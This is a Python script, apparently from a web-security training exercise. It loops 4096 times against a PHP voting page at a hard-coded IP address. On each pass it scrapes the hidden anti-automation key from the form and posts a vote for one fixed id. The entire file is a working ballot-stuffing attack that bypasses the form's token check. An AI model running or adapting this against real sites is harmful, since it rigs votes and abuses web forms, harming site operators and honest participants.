import requests
from bs4 import BeautifulSoup

URL = "http://158.69.76.135/level1.php"

payload = {"id": "1091", "holdthedoor": "Submit+Query", "key": ""}
s = requests.Session()

for i in range(4096):
    response = s.get(URL)
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, "html.parser")
        key = soup.find("input", {'name': "key"}).attrs['value']
        payload["key"] = key
        print("[GET]: The request has succeeded, key = {:s}.".format(key))
    else:
        print("[GET]: The request has fail : {:s}.".format(URL))
    response = s.post(URL, data=payload)
    if response.status_code == 200:
        print("{:d} The request has succeeded.".format(i))
    else:
        print("{:d} The request has fail.".format(i))
